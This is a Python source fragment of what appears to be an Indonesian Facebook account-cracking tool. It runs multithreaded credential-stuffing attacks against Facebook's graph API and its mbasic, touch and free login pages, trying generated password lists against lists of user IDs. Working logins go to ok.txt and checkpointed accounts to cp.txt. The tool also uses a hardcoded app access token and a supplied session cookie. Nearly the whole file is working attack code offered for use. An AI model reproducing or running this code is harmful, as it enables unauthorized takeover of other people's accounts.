				respon=ses.post("https://graph.facebook.com/auth/login",data={"locale":"id_ID","format":"json","email":user,"password":pw,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies":"1"}).text
				if "access_token" in respon:
					ok+=1
					#print(respon)
					try:
						birthday = ses.get(f'https://graph.facebook.com/me?access_token={respon["access_token"]}').text['birthday'].replace('/', '-')
					except: pass
					print(f"\r\x1b[1;32m * --> {user} • {pw}\x1b[0m\n",end="")
					open("ok.txt","a").write(f"{user}|{pw}\n")
					live.append(f"{user}{pw}")
					#react_me(kuke,beol)
					break
				elif "User must verify their account" in respon or "Untuk Sementara Akun Tidak Tersedia" in respon:
					cp+=1
					print(f"\r\x1b[1;33m * --> {user} • {pw}\x1b[0m\n",end="")
					open("cp.txt","a").write(f"{user}|{pw}\n")
					chek.append(f"{user}{pw}")
					break
				else:
					continue
		cot+=1
		print(f"\r\033[1;37m [Crack] {str(cot)}/{len(self.id)} Ok:-{str(ok)} Cp:-{str(cp)}",end="")
	def ngontol(self):
		from moshi_moshi import sandikrek
		nanya=input("\n%s [%s•%s•%s] Choose: "%(put,k,m,put))
		if nanya in[""," "]:
			print("%s [%s•%s•%s] Di Larang Kosong"%(put,k,m,put));self.ngontol()
		elif nanya in["1","01"]:
			print("\n%s [%s•%s•%s] Hasil [OK] Tersimpan Di : ok.txt\n%s [%s•%s•%s] Hasil [CP] Tersimpan Di : cp.txt\n%s [%s•%s•%s] Mode Pesawat 5/10 Detik Jika Tidak Ada Hasil\n"%(put,k,m,put,put,k,m,put,put,k,m,put))
			with Bool(max_workers=30) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[login]")
						pewe=sandikrek.pw_list(xi)
						tokai.submit(self.crackapi1,xi[0],pewe)
					except:pass
			hasil(live,chek)
		elif nanya in["2","02"]:
			print("\n%s [%s•%s•%s] Hasil [OK] Tersimpan Di : ok.txt\n%s [%s•%s•%s] Hasil [CP] Tersimpan Di : cp.txt\n%s [%s•%s•%s] Mode Pesawat 5/10 Detik Jika Tidak Ada Hasil\n"%(put,k,m,put,put,k,m,put,put,k,m,put))
			with Bool(max_workers=30) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[login]")
						pewe=sandikrek.pw_list(xi)
						tokai.submit(self.graph,xi[0],pewe)
					except:pass
			hasil(live,chek)
		elif nanya in["3","03"]:
			print("\n%s [%s•%s•%s] Hasil [OK] Tersimpan Di : ok.txt\n%s [%s•%s•%s] Hasil [CP] Tersimpan Di : cp.txt\n%s [%s•%s•%s] Mode Pesawat 5/10 Detik Jika Tidak Ada Hasil\n"%(put,k,m,put,put,k,m,put,put,k,m,put))
			with Bool(max_workers=50) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[login]")
						pewe=sandikrek.pw_list(xi)
						tokai.submit(self.modol,xi[0],pewe,"https://mbasic.facebook.com")
					except:pass
			hasil(live,chek)
		elif nanya in["4","04"]:
			print("\n%s [%s•%s•%s] Hasil [OK] Tersimpan Di : ok.txt\n%s [%s•%s•%s] Hasil [CP] Tersimpan Di : cp.txt\n%s [%s•%s•%s] Mode Pesawat 5/10 Detik Jika Tidak Ada Hasil\n"%(put,k,m,put,put,k,m,put,put,k,m,put))
			with Bool(max_workers=50) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[login]")
						pewe=sandikrek.pw_list(xi)
						tokai.submit(self.modol,xi[0],pewe,"https://touch.facebook.com")
					except:pass
			hasil(live,chek)
		elif nanya in ["5","05"]:
			print("\n%s [%s•%s•%s] Hasil [OK] Tersimpan Di : ok.txt\n%s [%s•%s•%s] Hasil [CP] Tersimpan Di : cp.txt\n%s [%s•%s•%s] Mode Pesawat 5/10 Detik Jika Tidak Ada Hasil\n"%(put,k,m,put,put,k,m,put,put,k,m,put))
			with Bool(max_workers=50) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[login]")
						pewe=sandikrek.pw_list(xi)
						tokai.submit(self.modol,xi[0],pewe,"https://free.facebook.com")
					except:pass
			hasil(live,chek)
		else:
			print("%s [%s•%s•%s] Isi Yang Bener Ngentod"%(put,k,m,put));self.ngontol()

def hasil(tukang,ngocok):
	if len(tukang) != 0 or len(ngocok) != 0:
		print("")
	else:exit("\n%s [%s•%s•%s] Gak Dapat Hasil? Coba Pake Methode Free Facebook \n [%s•%s•%s] Jika Masih Tidak Ada Hasil Berarti Lu Harus Gans :v"%(put,k,m,put,k,m,put))

def zxss(kuk):
	dict={}
	if "; " in kuk:
		kek=kuk.split("; ")
		if len(kek)==1:
			return {"cookie":kuk}
		else:
			for x in kek:
				dict.update({x.split("=")[0]:x.split("=")[1]})
			return dict
	else:
		kek=kuk.split(";")
		if len(kek)==1:
			return {"cookie":kuk}
		else:
			for x in kek:
				dict.update({x.split("=")[0]:x.split("=")[1]})
				return dict

class asup:
	def __init__(self,cok):
		self.cok,self.url=cok,"https://mbasic.facebook.com"
	def login(self):
		try:
			cek=req.get(f"{self.url}/profile.php?v=info",cookies=zxss(self.cok)).text
			if "mbasic_logout_button" in cek:
				print("%s [%s•%s•%s] Login Success"%(put,k,m,put))
				print("\033[0;97m\033[0;97m [\033[1;33m•\033[1;91m•%s] Please Subscribe My Channel:)"%(put))
				os.system('xdg-open https://youtube.com/c/orbXDBdbsS')
				open("bukanmain/cookie","w").write(self.cok)
				from aracans import login,informasi
				if "Laporkan Masalah" in cek:
					akusangat=login.ryunaa(zxss(self.cok),self.url)
					informasi.info(zxss(self.cok),cek).myinfo()
					akusangat.sayangara()
					os.system('python ryu.py')
				else:
					akusangat=login.ryunaa(zxss(self.cok),self.url)
					akusangat.lang(zxss(self.cok))
					informasi.info(zxss(self.cok),cek).myinfo()
					akusangat.sayangara()
					os.system('python ryu.py')
			else:
				exit("%s [%s•%s•%s] Cookie Invalid"%(put,k,m,put))
		except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
			exit("%s [%s•%s•%s] Kesalahan Koneksi"%(put,k,m,put));self.ngontol()
def clear():
	os.system('clear')
if __name__=="__main__":
	tanggal = join
	expired = ['10', '09', '2030']
	exp = expired[0]+"-"+expired[1]+"-"+expired[2]
	#if tanggal >= exp:
		#print(f"%s [%s•%s•%s] Sekarang Tanggal -> {join}"%(put,k,m,put))
		#print(f"%s [%s•%s•%s] Expired Pada Tanggal -> {exp}"%(put,k,m,put))
		#print("%s [%s•%s•%s] Script Sudah Expired Mohon Hubungi Admin Untuk Di Perbarui\n [%s•%s•%s] Ketikan %s git pull %s Untuk Update Script! "%(put,k,m,put,k,m,put,H,put))
		#sys.exit()

	if os.path.exists("bukanmain"): pass
	else: os.mkdir("bukanmain")
	try:
		kueh=zxss(open("bukanmain/cookie","r").read().strip())
	except FileNotFoundError:
		os.system("clear")
		logo()
		print("%s~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"%(put))
		while True:
			a=input("%s [%s•%s•%s] Cookie: "%(put,k,m,put))
			if a in[""," "]:
				print("%s [%s•%s•%s] Di Larang Kosong"%(put,k,m,put))
			else:
				asup(a).login()
	try:
		tentang=json.loads(open("bukanmain/my_info","r").read().strip())
	except FileNotFoundError:
		from aracans import informasi
		informasi.info(kueh,req.get("https://mbasic.facebook.com/profile.php?v=info",cookies=kueh).text).myinfo();restart()
	if os.path.exists("cp.txt"): pass
	else: open("cp.txt","a").close()
	if os.path.exists("ok.txt"): pass
	else: open("ok.txt","a").close()
	ngentod().menu()
